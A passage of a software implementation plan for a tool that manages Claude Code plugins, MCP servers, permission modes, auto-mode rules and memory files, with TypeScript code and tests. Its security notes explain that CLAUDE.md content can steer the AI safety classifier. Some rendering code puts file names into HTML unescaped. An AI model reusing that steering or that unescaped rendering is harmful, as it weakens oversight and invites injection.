    const res = await fetch(`${srv.base}/api/cc/v1/plugins/nope`, {
      method: "POST", headers: { "content-type": "application/json" }, body: "{}",
    });
    expect(res.status).toBe(400);
  } finally {
    srv.cleanup();
  }
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** — in `http.ts`:

```ts
  const PLUGIN_OPS = new Set(["install", "uninstall", "enable", "disable", "update"]);

  routeRe("POST", /^\/api\/cc\/v1\/plugins\/([a-z]+)$/, async (req, _url, m, ctx) => {
    const op = m![1]!;
    if (!PLUGIN_OPS.has(op)) return new Response(`unknown plugin operation: ${op}`, { status: 400 });
    const ct = (req.headers.get("content-type") || "").toLowerCase();
    if (!ct.includes("application/json")) return new Response("application/json required", { status: 415 });
    // [SEC2-3] parity with /apply: installing a plugin is code execution on this box.
    const who = await ctx.callerIdentity();
    if (who.trust === "otherUser" && !ctx.localNoIdentityCaller) {
      return Response.json({ error: who.reject ?? "different tailnet user" }, { status: 403 });
    }
    const body = (await jsonBody<{ id?: string; scope?: string }>(req)) ?? {};
    if (!body.id) return new Response("id required", { status: 400 });
    try {
      return Response.json({ output: await pluginService.op(op as never, body.id, body.scope) });
    } catch (e) {
      return pluginErr(e);
    }
  });
```

Add the equivalent `POST /api/cc/v1/mcp` (body `{op:"add"|"remove", name, config?}`) and
`POST /api/cc/v1/marketplaces` (body `{op, source}`) following exactly this shape.

**Step 4: Run, verify pass.**

**Step 5: Commit** — `git commit -m "feat(cc-config): REST write routes with identity + content-type gates"`

**Additionally — new in this plan:**

A stale-write rejection (Task 12) must surface as **HTTP 409**, not 500 — the web client
distinguishes them to offer a reload-and-merge instead of an error toast.

`git commit -m "feat(cc-config): REST write routes + job progress"`

---

---

## Task 19: Protocol — `PermissionMode` gains `auto` and `dontAsk`

**Files:**
- Modify: `docs/plans/anvil-protocol.ts` (the real file; `anvild/protocol.ts` is a symlink)
- Modify: `anvild/test/contract/protocol-surface.golden.json` (regenerated)

**Step 1: Edit the union**

In `docs/plans/anvil-protocol.ts`, replace the `PermissionMode` type and its constant:

```ts
export type PermissionMode =
  | "default" // Manual: CC's standard engine — safe tools auto-allowed, everything else prompts
  | "acceptEdits" // file edits auto-accepted; other prompt-worthy tools still prompt
  | "plan" // read-only planning: edits/writes blocked
  | "auto" // classifier-gated: runs everything, blocks irreversible/destructive/exfiltrating actions
  | "dontAsk" // auto-DENIES anything that would prompt; only pre-approved tools run (CI)
  | "bypassPermissions"; // DANGER: never prompt — allow every tool

export const PERMISSION_MODES: readonly PermissionMode[] = [
  "default",
  "acceptEdits",
  "plan",
  "auto",
  "dontAsk",
  "bypassPermissions",
];
```

This is **additive to a string union already carried on existing envelopes**, so `PROTOCOL_VERSION`
stays **5** (design §5 constraint 5).

**Step 2: Verify the CLI accepts both**

Run: `claude --help | grep -A3 'permission-mode'`
Expected: the choices list contains `auto` and `dontAsk`. If it does not, the installed CC predates
them — stop and upgrade before continuing.

**Step 3: Regenerate the golden**

Run: `bun test/contract/regen-golden.ts`
Then: `bun test test/contract/`
Expected: PASS. `protocolVersion` must still read `5`; only wire types change if at all.

**Step 4: Typecheck both projects**

Run: `bun run typecheck && bun run typecheck:web`
Expected: clean. A web break here is the designed detector for a missed picker site.

**Step 5: Commit**

`git commit -m "feat(protocol): PermissionMode gains auto + dontAsk (additive, v5 unchanged)"`

---

## Task 20: `auto` becomes the new-session default

**Files:**
- Modify: `anvild/web/src/dialogs.ts:283` (`DEFAULT_PERMISSION_MODE`) and the picker at `:285`
- Modify: `anvild/src/cc/turn-runner.ts` (fallback mode)
- Create: `anvild/test/unit/permission-mode-default.test.ts`

**Step 1: Write failing test**

`anvild/test/unit/permission-mode-default.test.ts`:

```ts
/**
 * `auto` replaces `bypassPermissions` as the default for new sessions (cc-config design D-6).
 * 3084128 mapped the old `mostly-autonomous` policy onto `bypassPermissions` as "the closest
 * behavioral match", which kept the rarely-prompted half and dropped the destructive-action floor.
 * CC's classifier restores the floor without Anvil owning any of the logic.
 *
 * `claude -p` does NOT inherit CC's new built-in default — the docs are explicit that -p starts in
 * `default` — so the turn-runner must pass the mode explicitly or the session gets nothing.
 */
import { test, expect } from "bun:test";
import { PERMISSION_MODES, isPermissionMode } from "@protocol";

test("auto and dontAsk are valid protocol permission modes", () => {
  expect(isPermissionMode("auto")).toBe(true);
  expect(isPermissionMode("dontAsk")).toBe(true);
  expect(PERMISSION_MODES).toContain("auto");
});

test("the turn-runner's fallback mode is auto, not default or bypassPermissions", async () => {
  const src = await Bun.file(`${import.meta.dir}/../../src/cc/turn-runner.ts`).text();
  // The spawn line reads: s.data.permissionMode ?? this.deps.permissionMode ?? "<fallback>"
  const m = src.match(/permissionMode\s*\?\?\s*this\.deps\.permissionMode\s*\?\?\s*"([a-zA-Z]+)"/);
  expect(m?.[1]).toBe("auto");
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/permission-mode-default.test.ts`
Expected: FAIL — fallback is currently `"default"`

**Step 3: Implement**

In `src/cc/turn-runner.ts`, change the spawn fallback:

```ts
      // The session's own mode, 1:1 with the CLI engine (protocol delta 1); re-read every spawn so a
      // mid-conversation session.set_permission_mode lands on the next turn. Fallback is `auto`:
      // `claude -p` does NOT inherit CC's built-in auto default (docs are explicit that -p starts in
      // `default`), so an unset mode must be named explicitly or the session loses the classifier.
      "--permission-mode", s.data.permissionMode ?? this.deps.permissionMode ?? "auto",
```

In `web/src/dialogs.ts`, change the default and the picker:

```ts
// New sessions default to "auto" — CC's classifier blocks irreversible/destructive actions while
// keeping the session unattended. Replaces the old "bypassPermissions" default, which had no floor.
const DEFAULT_PERMISSION_MODE: PermissionMode = "auto";
const PERMISSION_PICKER = `
  <option value="auto" data-icon="shield" selected>Auto — run freely, classifier blocks destructive actions</option>
  <option value="default" data-icon="pause">Manual — ask before most actions</option>
  <option value="acceptEdits" data-icon="edit">Accept edits — auto-approve file edits</option>
  <option value="plan" data-icon="map">Plan — read-only</option>
  <option value="dontAsk" data-icon="lock">Don't ask — only pre-approved tools (CI)</option>
  <option value="bypassPermissions" data-icon="bolt">Bypass — skip all checks ⚠️</option>`;
```

**Step 4: Verify**

Run: `bun test test/unit/permission-mode-default.test.ts && bun run typecheck && bun run typecheck:web && bun run build:web`
Expected: all pass.

**Step 5: Commit**

`git commit -m "feat(cc-config): auto is the new-session default, restoring the destructive-action floor"`

---

## Task 21: Sync diff computation

**Files:** Create `anvild/src/session/plugin-sync.ts`, `anvild/test/unit/plugin-sync.test.ts`

**Step 1: Write failing test**

```ts
import { test, expect } from "bun:test";
import { diffPlugins } from "../../src/session/plugin-sync";
import type { PluginInfo } from "../../src/cc/plugins";

const p = (id: string, version = "1.0.0"): PluginInfo => {
  const [name, marketplace = ""] = id.split("@");
  return { id, name: name!, marketplace, version, enabled: true, scope: "user", mcpServers: [] };
};

test("items on source but not target are installs", () => {
  const d = diffPlugins([p("a@m"), p("b@m")], [p("a@m")]);
  expect(d.install.map((x) => x.id)).toEqual(["b@m"]);
  expect(d.remove).toEqual([]);
});

test("items only on target are removals — and are never pre-selected", () => {
  const d = diffPlugins([p("a@m")], [p("a@m"), p("local@m")]);
  expect(d.remove.map((x) => x.id)).toEqual(["local@m"]);
  expect(d.remove.every((x) => x.selected === false)).toBe(true);
  expect(d.install.every((x) => x.selected === true)).toBe(true);
});

test("a version difference is reported separately from an install", () => {
  const d = diffPlugins([p("a@m", "2.0.0")], [p("a@m", "1.0.0")]);
  expect(d.update).toHaveLength(1);
  expect(d.update[0]).toMatchObject({ id: "a@m", sourceVersion: "2.0.0", targetVersion: "1.0.0" });
  expect(d.install).toEqual([]);
});

test("identical sets produce an empty diff", () => {
  const d = diffPlugins([p("a@m")], [p("a@m")]);
  expect(d.install.length + d.remove.length + d.update.length).toBe(0);
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** `anvild/src/session/plugin-sync.ts`:

```ts
/**
 * Cross-box plugin sync (design §4.4). Sync NEVER mutates implicitly: this computes a diff, the UI
 * renders it with a checkbox per row, and only ticked rows are applied to the target. Removals are
 * deliberately unselected by default — per-box uniqueness is the point, so a member's local extras
 * must survive a careless click.
 */
import type { PluginInfo } from "../cc/plugins";

export interface DiffRow {
  id: string;
  name: string;
  selected: boolean;
}
export interface UpdateRow extends DiffRow {
  sourceVersion: string;
  targetVersion: string;
}
export interface PluginDiff {
  install: DiffRow[];
  remove: DiffRow[];
  update: UpdateRow[];
}

export function diffPlugins(source: PluginInfo[], target: PluginInfo[]): PluginDiff {
  const byId = (list: PluginInfo[]): Map<string, PluginInfo> => new Map(list.map((p) => [p.id, p]));
  const s = byId(source);
  const t = byId(target);
  const diff: PluginDiff = { install: [], remove: [], update: [] };

  for (const [id, sp] of s) {
    const tp = t.get(id);
    if (!tp) diff.install.push({ id, name: sp.name, selected: true });
    else if (tp.version !== sp.version) {
      diff.update.push({ id, name: sp.name, selected: true, sourceVersion: sp.version, targetVersion: tp.version });
    }
  }
  for (const [id, tp] of t) {
    if (!s.has(id)) diff.remove.push({ id, name: tp.name, selected: false });
  }
  return diff;
}
```

**Step 4: Run, verify pass.** Expected: PASS (4 tests).

**Step 5: Commit** — `git commit -m "feat(cc-config): cross-box sync diff"`

**Additionally — new in this plan:**

**Memory is NOT in the diff** — Phase B (design §8).

Add a test asserting memory is absent from the diff result, so a later contributor cannot add it
without deciding the merge semantics first.

`git commit -m "feat(cc-config): sync diff over plugins, MCP, autoMode"`

---

## Task 22: Sync REST endpoint

**Files:** Modify `anvild/src/server/http.ts`; extend `anvild/test/integration/plugin-routes.test.ts`

`POST /api/cc/v1/plugins/sync/plan` with `{sourceUrl}` → the hub fetches the source server's plugin
list, compares against its own via `diffPlugins`, returns the diff.
`POST /api/cc/v1/plugins/sync/apply` with `{install:[], remove:[], update:[]}` → executes ONLY the
listed ids through `pluginService.op`, returning a per-item `{id, ok, error?}` array. **Never**
report overall success when any item failed (design §7).

Test: an apply where one item throws returns `ok:false` for that item and `ok:true` for the others,
and the response is still 200 with per-item detail.

**Commit:** `git commit -m "feat(cc-config): sync plan/apply endpoints with per-item results"`

---

## Task 23: Web — `ccconfig.ts` seam + Settings section shell

**Files:** Create `anvild/web/src/ccconfig.ts`; modify `anvild/web/src/settings.ts` (tab list ~line 128, panel section ~line 136), `anvild/web/src/main.ts` (init call).

**Step 1: Add the tab button** — in `settings.ts`, after the Prompts tab:

```html
      <button class="stab" role="tab" data-tab="cc-config">${icon("extension")} Plugins</button>
```

Add `"cc-config"` to the `SettingsTab` union (~line 118).

**Step 2: Add the panel section** — after the prompts `<section>`:

```html
      <section class="settings-panel" data-tab="cc-config">
        <div class="section-head"><h3>Plugins &amp; MCP</h3><button id="plugins-sync" class="mini">${icon("sync")} Sync…</button></div>
        <p class="small muted">Plugins and MCP servers are installed per machine. Changes apply to each session's next turn.</p>
        <div id="plugin-cards"><p class="small muted">Loading…</p></div>
      </section>
```

**Step 3: Create the seam** `anvild/web/web/src/ccconfig.ts` → `anvild/web/src/ccconfig.ts`:

```ts
// ── Plugins & MCP: per-server management over the daemon's /api/cc/v1 surface ──────────────────
// One section per connected server (plugins are per machine). Gated on the "cc-config" capability so
// an older daemon renders nothing rather than dead controls — the ccCardRowHtml pattern.
import { busy, esc, icon, repaintPreservingInput } from "./dom";
import { confirmDialog, toast } from "./dialogs";
import { orderedServers, serverFetch, serverSupports, cssId, type Server } from "./fleet";

interface PluginRow { id: string; name: string; marketplace: string; version: string; enabled: boolean; scope: string }
interface McpRow { name: string; target?: string; connected: boolean; raw?: boolean }

export async function renderPluginCards(): Promise<void> {
  const host = document.getElementById("plugin-cards");
  if (!host) return;
  const targets = orderedServers().filter((s) => serverSupports(s, "cc-config"));
  if (!targets.length) {
    host.innerHTML = `<p class="small muted">No connected server supports plugin management yet.</p>`;
    return;
  }
  host.innerHTML = targets.map((srv) => `<div class="card" id="plug-${cssId(srv.url)}"><p class="small muted">Loading ${esc(srv.name)}…</p></div>`).join("");
  await Promise.all(targets.map((srv) => loadServer(srv)));
}

async function loadServer(srv: Server): Promise<void> {
  const card = document.getElementById(`plug-${cssId(srv.url)}`);
  if (!card) return;
  try {
    const [pl, mcp] = await Promise.all([
      (await serverFetch(srv.url, "/api/cc/v1/plugins")).json() as Promise<{ plugins: PluginRow[] }>,
      (await serverFetch(srv.url, "/api/cc/v1/mcp")).json() as Promise<{ servers: McpRow[] }>,
    ]);
    card.innerHTML = cardHtml(srv, pl.plugins ?? [], mcp.servers ?? []);
    wireCard(srv, card);
  } catch (e) {
    card.innerHTML = `<b>${esc(srv.name)}</b><p class="small muted">Couldn't load plugins: ${esc(e instanceof Error ? e.message : String(e))}</p>`;
  }
}
```

(Continue with `cardHtml` and `wireCard` in Tasks 15–17.)

**Step 4: Call it** — in `settings.ts`'s `selectSettingsTab`, when the tab is `plugins`, call `void renderPluginCards()`.

**Step 5: Verify**

Run: `bun run typecheck:web && bun run build:web`
Expected: clean.

**Step 6: Commit** — `git commit -m "feat(web): Plugins settings tab shell"`

---

## Task 24: Web — plugin + MCP rendering and actions

### Web — render plugin + MCP rows

**Files:** Modify `anvild/web/src/ccconfig.ts`

Implement `cardHtml(srv, plugins, mcp)` returning:

- a header line: server name + host;
- one row per plugin: `name@marketplace`, version, `scope` chip, an on/off state, and buttons
  `Disable`/`Enable`, `Update`, `Uninstall` (each `data-id` carrying the plugin id);
- an `Install from marketplace` button (`data-srv`);
- an MCP block listing `name — target` with `✔ connected` / `⚠ needs attention`, a `Remove` button
  per row, and an `Add server` button. A row with `raw: true` renders its text verbatim in a
  `<code>` with a "couldn't parse" note.

Escape every interpolated value with `esc()`. **Never** render secret values — names, targets and
status only (design §8).

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): render plugin and MCP rows per server"`

### Web — plugin actions

**Files:** Modify `anvild/web/src/ccconfig.ts`

Implement `wireCard`:

```ts
function wireCard(srv: Server, card: HTMLElement): void {
  card.querySelectorAll<HTMLButtonElement>("[data-op]").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const op = btn.dataset.op!;
      const id = btn.dataset.id!;
      if ((op === "uninstall" || op === "disable") && !(await confirmDialog(`${op === "uninstall" ? "Uninstall" : "Disable"} ${id}?`, { danger: true }))) return;
      await busy(btn, `${op}…`, async () => {
        const res = await serverFetch(srv.url, `/api/cc/v1/plugins/${op}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id }),
        });
        if (!res.ok) {
          toast(`${op} failed: ${await res.text()}`);
          return;
        }
        toast(`${id} ${op}d — applies to the next turn`);
        await loadServer(srv);
      });
    });
  });
}
```

Every async button goes through `busy()`; every destructive one through `confirmDialog`.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): plugin install/enable/disable/update/uninstall actions"`

### Web — MCP add/remove

**Files:** Modify `anvild/web/src/ccconfig.ts`, `anvild/web/src/dialogs.ts`

Add a `showAddMcpServer(srv)` modal via `modalPromise`/`showModal` collecting: name, transport
(`stdio` | `http` | `sse`), command+args or URL, and optional headers/env as key=value lines. Submit
posts `{op:"add", name, config}` to `/api/cc/v1/mcp`.

Because this modal holds secrets, it must repaint through `repaintPreservingInput` if it is ever
re-rendered, and its values must never be logged or echoed into a toast.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): add and remove MCP servers"`

---

## Task 25: Web — auto-mode editor with `$defaults` guard

**Files:**
- Modify: `anvild/web/src/ccconfig.ts`
- Create: `anvild/test/web/ccconfig-automode.test.ts`

**Step 1: Write failing test**

```ts
/**
 * The auto-mode editor's one job beyond rendering: make the `$defaults` footgun impossible to hit by
 * accident. Saving a section WITHOUT the literal "$defaults" discards CC's entire built-in list for
 * that section — silently, with no CLI error. The editor seeds it and warns loudly if removed.
 */
import { test, expect, beforeEach } from "bun:test";
import { JSDOM } from "jsdom";
import { renderAutoModeSection, defaultsWarning } from "../../web/src/ccconfig";

beforeEach(() => {
  const dom = new JSDOM("<!doctype html><div id=root></div>");
  (globalThis as unknown as { document: Document }).document = dom.window.document;
});

test("a new section is seeded with $defaults", () => {
  const el = renderAutoModeSection("soft_deny", [], ["builtin-1"]);
  expect(el.querySelector("textarea")!.value.split("\n")[0]).toBe("$defaults");
});

test("no warning when $defaults is present", () => {
  expect(defaultsWarning(["$defaults", "mine"], 12)).toBe(null);
});

test("removing $defaults warns and names how many built-ins would be lost", () => {
  const w = defaultsWarning(["mine"], 12);
  expect(w).toContain("12");
  expect(w?.toLowerCase()).toContain("discard");
});

test("an empty section also warns — [] discards the defaults too", () => {
  expect(defaultsWarning([], 12)).not.toBe(null);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/web/ccconfig-automode.test.ts`
Expected: FAIL — exports missing

**Step 3: Implement** (in `web/src/ccconfig.ts`)

```ts
/** Null when the edit inherits CC's built-ins; otherwise the warning to show before saving. */
export function defaultsWarning(entries: string[], builtinCount: number): string | null {
  if (entries.includes("$defaults")) return null;
  return `This section omits $defaults, so saving will discard all ${builtinCount} of Claude Code's built-in rules for it. Add "$defaults" to keep them.`;
}

export function renderAutoModeSection(name: string, entries: string[], builtins: string[]): HTMLElement {
  const wrap = document.createElement("section");
  wrap.className = "cc-automode-section";
  const seeded = entries.length ? entries : ["$defaults"];
  wrap.innerHTML = `
    <h4>${name}</h4>
    <textarea rows="6" spellcheck="false"></textarea>
    <p class="cc-automode-warn" hidden></p>
    <p class="cc-automode-effective">${builtins.length} built-in rules available</p>`;
  const ta = wrap.querySelector("textarea") as HTMLTextAreaElement;
  ta.value = seeded.join("\n");
  const warn = wrap.querySelector(".cc-automode-warn") as HTMLElement;
  const sync = (): void => {
    const lines = ta.value.split("\n").map((l) => l.trim()).filter(Boolean);
    const w = defaultsWarning(lines, builtins.length);
    warn.textContent = w ?? "";
    warn.hidden = w === null;
  };
  ta.addEventListener("input", sync);
  sync();
  return wrap;
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/web/ccconfig-automode.test.ts && bun run typecheck:web && bun run build:web`
Expected: PASS + clean.

**Step 5: Commit**

`git commit -m "feat(web): auto-mode editor with \$defaults discard guard"`

---

## Task 26: Web — memory browser/editor

**Files:**
- Modify: `anvild/web/src/ccconfig.ts`
- Create: `anvild/test/web/ccconfig-memory.test.ts`

**Step 1: Write failing test**

```ts
/**
 * The memory section replaces the TUI-only /memory. MEMORY.md is rendered first and flagged as the
 * only file loaded every session; the budget warning must appear BEFORE saving, because CC accepts an
 * over-budget write and then drops the overflow on next load.
 */
import { test, expect, beforeEach } from "bun:test";
import { JSDOM } from "jsdom";
import { renderMemoryList, budgetLabel } from "../../web/src/ccconfig";

beforeEach(() => {
  const dom = new JSDOM("<!doctype html><div id=root></div>");
  (globalThis as unknown as { document: Document }).document = dom.window.document;
});

const files = [
  { name: "MEMORY.md", bytes: 400, modified: "2026-08-15T00:00:00.000Z" },
  { name: "debugging.md", bytes: 900, modified: "2026-08-15T00:00:00.000Z" },
];

test("MEMORY.md renders first and is marked as the always-loaded index", () => {
  const el = renderMemoryList(files, { lines: 10, bytes: 400, state: "ok" });
  const rows = el.querySelectorAll(".cc-mem-row");
  expect(rows[0]!.textContent).toContain("MEMORY.md");
  expect(rows[0]!.textContent!.toLowerCase()).toContain("loaded every session");
});

test("an empty memory dir explains itself rather than rendering blank", () => {
  const el = renderMemoryList([], { lines: 0, bytes: 0, state: "ok" });
  expect(el.textContent!.toLowerCase()).toContain("nothing remembered yet");
});

test("budgetLabel escalates ok → near → over", () => {
  expect(budgetLabel({ lines: 10, bytes: 100, state: "ok" })).toContain("10");
  expect(budgetLabel({ lines: 190, bytes: 100, state: "near" }).toLowerCase()).toContain("near");
  expect(budgetLabel({ lines: 260, bytes: 100, state: "over" }).toLowerCase()).toContain("dropped");
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/web/ccconfig-memory.test.ts`
Expected: FAIL — exports missing

**Step 3: Implement** (in `web/src/ccconfig.ts`)

```ts
interface Budget { lines: number; bytes: number; state: "ok" | "near" | "over" }
interface MemFile { name: string; bytes: number; modified: string }

export function budgetLabel(b: Budget): string {
  const base = `${b.lines} lines · ${(b.bytes / 1024).toFixed(1)} KB`;
  if (b.state === "over") return `${base} — over the limit; everything past it is dropped on the next load`;
  if (b.state === "near") return `${base} — near the 200-line / 25 KB limit`;
  return base;
}

export function renderMemoryList(files: MemFile[], indexBudget: Budget): HTMLElement {
  const wrap = document.createElement("div");
  wrap.className = "cc-mem-list";
  if (!files.length) {
    wrap.innerHTML = `<p class="cc-mem-empty">Nothing remembered yet. Claude writes here as it learns; you can also add notes directly.</p>`;
    return wrap;
  }
  wrap.innerHTML = files
    .map((f) => {
      const note =
        f.name === "MEMORY.md"
          ? `<span class="cc-mem-note">index · loaded every session · ${budgetLabel(indexBudget)}</span>`
          : `<span class="cc-mem-note">read on demand</span>`;
      return `<div class="cc-mem-row" data-file="${f.name}">
        <span class="cc-mem-name">${f.name}</span>${note}
        <button class="cc-mem-edit" data-file="${f.name}">Edit</button>
        <button class="cc-mem-del" data-file="${f.name}">Delete</button>
      </div>`;
    })
    .join("");
  return wrap;
}
```

Wire the Edit button to a `modalPromise` textarea that PUTs with the file's `modified` as
`expectedModified`, and on **HTTP 409** re-fetches and tells the user Claude changed the file
mid-edit, offering to reload.

**Step 4: Run test, verify pass**

Run: `bun test test/web/ccconfig-memory.test.ts && bun run typecheck:web && bun run build:web`
Expected: PASS + clean.

**Step 5: Commit**

`git commit -m "feat(web): memory browser/editor replacing TUI-only /memory"`

---

## Task 27: Web — sync diff UI

**Files:** Modify `anvild/web/src/ccconfig.ts`

`#plugins-sync` opens a modal: pick source and target from connected servers, POST `sync/plan`,
render three groups (Install / Update / Remove) with a checkbox per row — installs and updates
pre-ticked, **removals unticked** — then POST `sync/apply` with the ticked ids and render per-item
results inline (✔ / ⚠ + message), leaving the modal open so failures stay readable.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): per-item sync diff UI"`

---

## Task 28: Web DOM tests

**Files:** Create `anvild/test/web/plugins-panel.test.ts`

Using `installDom` + a URL-routing `fetch` stub (copy `test/web/cc-update-card.test.ts`):

- no server advertising `plugins` → the panel renders the "no connected server" message and **no
  buttons**;
- a server with two plugins renders two rows with correct ids;
- clicking Uninstall calls `confirmDialog` and POSTs to `/api/cc/v1/plugins/uninstall`;
- a failing POST surfaces a toast and does **not** claim success.

**Run:** `bun test test/web/plugins-panel.test.ts` → PASS
**Commit:** `git commit -m "test(web): plugins panel DOM coverage"`

---

## Task 29: Docs

**Files:**
- Modify: `docs/ARCHITECTURE.md`, `SECURITY.md`

Add to `ARCHITECTURE.md`: `CcConfigService` in the domain-service list, and the four-domain table
from design §1.

Add to `SECURITY.md` the two hazards from design §9, stated plainly:

1. **The auto-mode classifier reads CLAUDE.md.** An instruction there steers the safety gate as well
   as the agent. CC auto-allows CLAUDE.md edits only *where the content does not change permissions,
   authorizations, or auto-mode behaviour*. The merged `claude-md-reflection.ts` writes CLAUDE.md from
   an agent turn and is in scope for that rule. Any future memory/CLAUDE.md sync moves
   classifier-steering content between machines and must be treated as privileged, not a file copy.
2. **`autoMode` is written only to `~/.claude/settings.json`.** CC deliberately excludes project
   settings from autoMode resolution so a checked-in repo cannot inject allow rules; writing there
   would reopen that hole.

`git commit -m "docs(cc-config): architecture + security notes"`

## Task 30: Live pass on hub + one member

**Not automated. Record results in the status table above.**

Per domain on the hub: install and uninstall a real plugin; add and remove an MCP server; edit an
auto-mode `allow` rule and confirm `claude auto-mode config` reflects it; edit `MEMORY.md` and confirm
the next turn sees the change. Then run one sync between the hub and one member and confirm per-item
results.

Also confirm the two behaviors that only appear live:

- A new session reports `permissionMode: auto` in its `init` line.
- Adding `Bash(git push *)` to `permissions.ask` in `~/.claude/settings.json` produces a
  `permission.request` card on the phone when the agent pushes — the human-checkpoint recipe from
  design §6.5. This is the one path that proves auto mode and Anvil's approval card compose.

`git commit -m "docs(cc-config): live pass results"`

